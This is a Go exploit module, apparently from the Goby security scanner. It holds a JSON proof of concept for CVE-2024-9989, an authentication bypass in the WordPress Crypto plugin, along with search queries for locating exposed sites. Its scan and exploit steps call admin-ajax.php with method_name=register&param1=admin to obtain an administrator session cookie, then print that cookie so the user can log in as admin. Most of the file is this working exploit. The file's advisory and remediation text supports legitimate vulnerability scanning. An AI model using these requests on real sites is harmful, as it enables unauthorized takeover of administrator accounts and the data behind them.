package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress Crypto Plugin /wp-admin/admin-ajax.php Permission Bypass Vulnerability (CVE-2024-9989)",
    "Description": "<p>The WordPress Crypto plugin is a plugin for supporting cryptocurrency payment and trading functionality, often integrated with WordPress e-commerce plugins like WooCommerce, supporting multiple cryptocurrency payments and related features. This vulnerability exists in Crypto plugin version 2.15 and below. Due to insufficient restrictions on arbitrary method calls in the crypto_connect_ajax_process function's crypto_connect_ajax_process::log_in function, attackers can construct malicious requests to log in as any existing user (e.g., administrator) on the site, leading to authentication bypass.</p>",
    "Product": "WordPress Crypto Plugin",
    "Homepage": "http://www.wordpress.com/",
    "DisclosureDate": "2024-10-30",
    "PostTime": "2025-01-08",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"wp-content/plugins/crypto/\" && body=\"WordPress\"",
    "GobyQuery": "body=\"wp-content/plugins/crypto/\" && body=\"WordPress\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to log in as any existing user, potentially leading to complete control of the website, sensitive data leakage, or further malicious operations.</p>",
    "Recommendation": "<p>1. It is recommended to immediately upgrade the Crypto plugin to version 2.15 or above.</p><p>2. Additionally, it is advised to close the internet exposure or set interface access permissions to reduce the attack surface.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/144918297?spm=1001.2014.3001.5501"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "GetCookies",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=crypto_connect_ajax_process&method_name=register&param1=admin",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"error\":false,\"msg\":\"success\",\"count\":\"0\"}",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "regex",
                        "value": "Set-Cookie:\\s*([^;]+);.*",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Cookie|lastheader|regex|Set-Cookie:\\s*([^;]+);.*",
                "vulurl|define|variable|/wp-admin/admin-ajax.php"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                    "accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Cookie": "{{{Cookie}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|define|variable|/wp-admin/admin-ajax.php"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=crypto_connect_ajax_process&method_name=register&param1=admin",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"error\":false,\"msg\":\"success\",\"count\":\"0\"}",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "regex",
                        "value": "Set-Cookie:\\s*([^;]+);.*",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Cookie|lastheader|regex|Set-Cookie:\\s*([^;]+);.*"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                    "accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Cookie": "{{{Cookie}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "cookies|lastreq|regex|Cookie: (.*)",
                "output|define|variable|Please log in using the following cookie: {{{CRLF}}}{{{cookies}}}"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2024-9989"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "WordPress Crypto 插件 /wp-admin/admin-ajax.php 权限绕过漏洞（CVE-2024-9989）",
            "Product": "WordPress",
            "Description": "<p>WordPress Crypto 插件是一款用于支持加密货币支付和交易功能的插件，通常与 WordPress 电子商务插件（如 WooCommerce）集成，支持多种加密货币支付及相关功能。该漏洞存在于 Crypto 插件 2.15 及以下版本中，由于对 crypto_connect_ajax_process 函数中 crypto_connect_ajax_process::log_in 函数的任意方法调用限制不足，攻击者可以通过构造恶意请求，以站点上的任意现有用户（如管理员）身份登录，导致身份认证绕过。</p>",
            "Recommendation": "<p>1. 建议立即升级 Crypto 插件至 2.15 及以上版本。</p><p>2. 关闭互联网暴露面或设置接口访问权限，以减少攻击面。</p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者以任意现有用户身份登录，可能导致网站被完全控制，敏感数据泄露，或进一步的恶意操作。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "WordPress Crypto Plugin /wp-admin/admin-ajax.php Permission Bypass Vulnerability (CVE-2024-9989)",
            "Product": "WordPress Crypto Plugin",
            "Description": "<p>The WordPress Crypto plugin is a plugin for supporting cryptocurrency payment and trading functionality, often integrated with WordPress e-commerce plugins like WooCommerce, supporting multiple cryptocurrency payments and related features. This vulnerability exists in Crypto plugin version 2.15 and below. Due to insufficient restrictions on arbitrary method calls in the crypto_connect_ajax_process function's crypto_connect_ajax_process::log_in function, attackers can construct malicious requests to log in as any existing user (e.g., administrator) on the site, leading to authentication bypass.</p>",
            "Recommendation": "<p>1. It is recommended to immediately upgrade the Crypto plugin to version 2.15 or above.</p><p>2. Additionally, it is advised to close the internet exposure or set interface access permissions to reduce the attack surface.</p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to log in as any existing user, potentially leading to complete control of the website, sensitive data leakage, or further malicious operations.</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9982"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
